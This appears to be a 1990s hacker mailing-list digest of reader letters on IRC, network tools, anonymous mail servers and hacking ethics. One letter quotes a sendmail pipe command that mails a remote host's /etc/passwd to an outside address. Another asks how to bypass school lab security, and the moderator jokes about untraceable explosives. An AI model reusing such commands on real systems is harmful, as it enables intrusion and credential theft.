HEADLINE NEWS: GET ON INFOWAR IRC HACKERS' GROUP!!!

From: k1neTiK <samk5@idt.net>

 For the people that don't already know, Infowar has an IRC server up at 
www.infowar.com port 6667 (this is the default port for IRC clients, so 
don't worry about it.), and the main channel is #hackers .  I would really 
like to see more people on this server, as the highest traffic so far has 
been only eight people.  I am on IRC from around 5:10 to 6:45 EST on 
weekdays, and erratically on Sundays, and I have a Fserv up which holds many 
of the mailings from the Happy Hacker list starting in December, and all the 
"Guides to (Mostly) Harmless Hacking".  If people would like me to hold more 
than that, please send requests to: samk5@idt.net or just tell me on IRC.  I 
will not be holding programs, as I have very little space left on my hard drive. 
Please, Please give the server a chance!  And don't just go there, and on 
finding out that there's no one there, just leave; stay a while!  I recommend 
connecting via an IRC client rather than using Java to access it, because, 
one; Java doesn't support DCC which means you can't use my Fserv, and two, 
you have scripting capability if you use an IRC client like mIRC.  If you 
are using mIRC, and you get on the server, and no one else is there, go to 
room #hackers (/join #hackers) and add the following line or something 
similar to your "Events" area of "Remote" (click on the remote icon, then 
click the Events tab) "1: ON JOIN:#hackers:/beep 5 1" 
without the quotation marks.  Then click "listening", click OK, then 
minimize.  Whenever someone joins you'll hear 5 beeps with 1 second 
intervals between them (format of beep command is /beep <number> <delay> so 
/beep 5 1 will produce 5 beeps with one second intervals) and then you can 
go back to your IRC program and talk to them!! 
  Once again, the server is www.infowar.com port 6667, and you can access it 
using Java (go to www.infowar.com, go to "Chat" and follow some links) or an 
IRC client. 
thank you for your patience, and Happy Hacking!

FCC HOAX UPDATE

To set the record straight, the TELCOs wanted to charge ISPs per minute 
for their use of high-speed lines.  The FCC decided _against_ the TELCOs 
in _December, 1996_.  All the FCC was asking for was public comment. 
They have done nothing to deserve the over 100,000 flames they've 
received for something _they had no intention of allowing_.

WHOIS AND WAIS ACCESS FOR THE WIN95-CHALLENGED

From: "Intergalactic <--" <intergalactic@hotmail.com>

Oh boy, do I look dumb! Awhile back I posted a message about using the Internet 
resources (ping, traceroute, etc.) at a.cni.org. Well, somewhere between the 
time I sent the post and the time it was posted, a.cni.org decided to 
password-protect the inetroom account. I have sent inquiring emails, but as of 
this date, no one has yet to reply. I apologize for the confusion I may have 
created, but Win95 users do not fear! You can access whois and WAIS by 
telnetting to rs.internic.org. If you are using Win95 you can still use ping 
and traceroute! To do a ping, go to your DOS prompt while you are connected to 
the 'net, make sure your in the WINDOWS directory and type

ping (IP address)

To use traceroute, get to your DOS prompt while connected to the 'net, make 
sure your in the C:/WINDOWS directory and type

tracert (IP address)

Again, sorry about the confusion! You know, it's sad but true, with all that 
pointing-and-clicking, most people using Win95 never realize what a computer can 
really do.

Sorry guys, I guessed I messed something up the first time I sent this so 
Carolyn 
thought I wrote the above or something, but this is what I wanted to post:

I get that same problem except mine looks like this:

blah~$ telnet foo.bar 
Host name lookup failure 
blah~$

I asked on EfNet in #linux and everyone screams, 'Your /etc/resolv.conf file!' 
Mine is right, but you may want to check yours.  I have setup my resolv.conf 
file and my /etc/ppp/pap-secrets file (my ISP uses NT (ack!) and PAP 
(Password Authentication Protocol).  I know how to use pppd with PAP so I can 
get on the Internet, just have to use the full IP when telneting.. etc. 
Have I missed some setup file or something?  /etc/inetd.conf , is there 
something in there I've missed?  Any help would be appreciated.

Thank you. 
I hope that I've been of some help and hope someone would help me.

SATAN QUESTION

Anonymise the following request for information, please...

I've recently come across a textfile written by the creators of SATAN that 
outlines many weaknesses in the typical UNIX machine.  One of the attacks 
detailed by the writers involves a user wishing to gain the passwd file of a 
remote host.  It went something like this:

user telnets to port 25 of remote host. 
user inputs line: 
Mail from: "|/bin/mail users@mailaddress.net < /etc/passwd"

user then inputs line: 
rcpt to: nosuchuser

and proceeds to quit the mail program since the data part of this process is 
irrelevant. 
If the user lucks out, the remote host's passwd file is then mailed to him. 
What I'm curious about is the complete lack of anonymity here.  Unless one 
had set up an account (or two or six) with a system much like old 
anon.penet.fi, one is technically screwed, yes?  I assume that system logs 
would show both the creation of this piece of mail and it's subsequent 
remailing back to the user in question, both of which have that user's email 
address all over them.  On the legal side of things, am I correct in 
assuming that the user is in no way liable until he cracks and makes use of 
passwords from the passwd file?

    Whooptee.  People basically said the same thing about Windows NT in 
the beginning.  "There isn't any shell access, how can we hack it?!!" 
Guess what, you don't need shell access to hack a server.  And that 
includes Macs.

    Without trying to start any OS wars, I think it is safe to claim that 
most technical people move on to other OSes rather than stick with MacOS 
and due to this there is a lack of real Mac hackers.  Give people a few 
months, when the become bored with Unix, WinNT and Novell and you'll 
start hearing about some more Mac exploits.

new, improved version of the NeXt flavor of Unix. NeXt boxes are notoriously 
hackable!

From: Tuna Man or BrainMaster <fifo@concentric.net>

Please feel free to flame me if you wish.. 
Does anyone have any information on bypassing the FOOLPROOF Mac security 
software? Strangely one of the 20 MACS in my school's lab was foolproof 
protected but it allowed me to delete and drag as I wish.  So I copied its 
preferences onto a disk and deleted its INIT ..therefore, I guess disabling it? 
anyway I have the disk but can't figure it out at home because of my PC..I'm 
only a freshman in H.s. and not a wannabe pleeze!..so I guess the worst 
thing they can do is kick me out of programming.  But if you have any 
information I would be thankful! I am not going to destroy the system.  I 
just want access.

ODE TO LYNX

Hey again, 
 I'm not sure if this is the right place to ask this, but what the h*** ;) 
I'm puttin up a TEXT-ONLY web page, and I'd like a good hit counter for 
it....I don't want one of the graphic one's, just one that *I* can see

HACKER WARS

From: Frankie Hayes <strider@unix.aardvarkol.com>

Hey Carolyn, 
 I'm sorry I can't quote very well on PINE (I hate it!! But it's all my 
ISP has) but I'm referring to your comment on hacker wars... 
 First, I really don't care for the idea of hacker wars, but if whatever 
it was is bad enough, I'd be *HAPPY* to screw some "bad guys" 
over....anyway, just thought I'd put my 2cents in.

HANDLES

From: thelord@godsplace.org

Pick something that has nothing to do with a book.  Pick something that 
no one would ever think of using as a handle.  If you use something from 
books, especially well-read ones, you're almost guaranteed someone else 
will use it too.

HIDING YOUR TRACKS

From: k1neTiK <samk5@idt.net>

Bronc Buster posted some info on checking anonymous servers and catching 
mail bombers, and I would like to elaborate and correct some info.  First of 
all, I want to make it clear that when someone says "anonymous server" they 
are not talking about something like what "anon.penet.fi" used to be, where 
you could send Email anonymously, rather, they mean a server which has an 
old enough version of Sendmail or any SMTP program that will not reveal much 
info about you in the header.  Second of all, the only thing Identd tells 
the mail server is your username (if it says "received from blah.com 
(samk5@ppp-48.ts-10.nyc.idt.net)" it found out the "samk5" part from 
Identd), third of all, if you are not running an Ident Daemon on your 
computer, Sendmail cannot use Identd to find out your Username, rather, 
first it checks to see if you have Identd running and if you don't, it makes 
a query somewhere (I forget the specifics) and finds it out that way.  Also, 
in regard to mIRC, in order for Bronc Busters technique to work, you must 
first turn "Show Identd requests" on in your options menu (at least I think 
it's in the options menu, look around).  Lastly, there is a much easier way 
to find out if a mail server is anonymous by just typing in "helo 
whatever.com" and seeing if it echoes "hello whatever.com" if it says "hello 
ppp-21.ts-8.nyc.idt.net" or something like that, or even worse, says "hello 
samk5@ppp-21.ts-8.nyc.idt.net" it is not anonymous.

>I was wondering how the heck can I attach a file if I telnet to a port on a 
>distant computer to send e-mail.

  In order to understand the answer you have to understand how "attach file" 
works.  Attach file works by UUencoding or MIME encoding a file into plain 
text so it can be sent in an ordinary message, sending it to someone, and 
then having their mail program decode it for them.  You will need a 
UUencoding or MIME encoding program, encode the file, then copy and paste 
the file content into the message.

INVITATION FOR OPEN DISCOURSE

X-Sender: mulder@ntplx.net

 ( a note: this letter is not meant as a flame but rather an invitation for 
open discourse. You can reply to me personally at mulder@ntplx.net, or to 
this list, but anything above a calm, rational conversation will be ignored 
for the ranting that it is. thank you.)

>up the line.

dear Ms. Meinel and the rest of this list:

        I'm a huge fan of you, what you do, and this list in general. I 
find it informative and fun to be a member of. So thank you.

        However, the above, and a number of other posts regarding the 
process of "nuking offensive web sites" disturbs me for a number of 
reasons. 
        Assuming the subject matter is NOT illegal (meaning I am not 
sticking up for kiddie porn and would appreciate not getting labeled a 
pervert for the rest of my life), just what gives you, me, or any other 
person, the right to decide what is suitable for  publishment on the 
Internet or not? If I see a site that I personally find distasteful, it no 
more gives me the right to persecute it and attempt to get it removed than 
it gives a nazi the right to attempt to destroy a Jewish homepage. the fact 
that nearly anyone with a computer now has a virtual printing press with 
which they can express themselves to a large group of people is perhaps the 
single greatest step towards true openness in society in the last hundred 
years. Implying that one's sense of what is "right" or "bad news" is any 
greater than someone else's, even if that person is what you consider evil, 
stupid, or vile, is a very definite step in the right direction.

        to truly weed out what you feel is wrong, education and not 
"nuking" is necessary.

thank you for your time,

Moderator: I have never advocated vandalism of Web sites. I believe in 
social pressure, including our right to not only beg "pretty please," but 
also insist that we all have the right to urge others -- yes, even the 
owners of ISPs! --  to refuse to help the people whom we oppose.

In fact, I also believe it is morally acceptable to organize letter writing 
campaigns, to strike, picket, demonstrate, and boycott.  Those were the 
peaceful tactics of  the Civil Rights movement for which we honor Martin 
Luther King.

Bottom line: if people want to dispense ugly weapon type programs -- newbie 
bait available at a mouse click -- I'm for keeping the dispensers of these 
programs on the run using any of these protest techniques.

If any of you have read the book _Great Mambo Chicken & the Transhuman 
Condition: Science Slightly over the Edge_ (Ed Regis, Addison Wesley, 1990, 
paperback) you already know that one of my hobbies is recreational 
explosives. If I wanted to build up my ego in a sick way, I could start 
putting out "Guides to (mostly) Harmless Explosives." I could set up a mail 
order service where with the click of a mouse people could order the 
materials that go into my favorite explosives exploits.  Heck, I could set 
up a place in a foreign country such as Zaire where laws are nonexistent and 
sell complete packaged explosives exploits. It is really, really phun to do 
stuph that gets the fire department, police and news media converging on you 
only to discover they can't bust you because there isn't even a trace left 
(e.g. zinc dust and s***** or potassium tri****** or a pot of molten zinc 
poured on *********!), muhahaha. Super for little kids' birthday parties.

But this kind of stuff takes face-to-face mentoring. Someone would probably 
get killed by messing up my recipes. I would deserve to, at the very least, 
get my GTMHHs hounded to the darkest corners of the Internet.
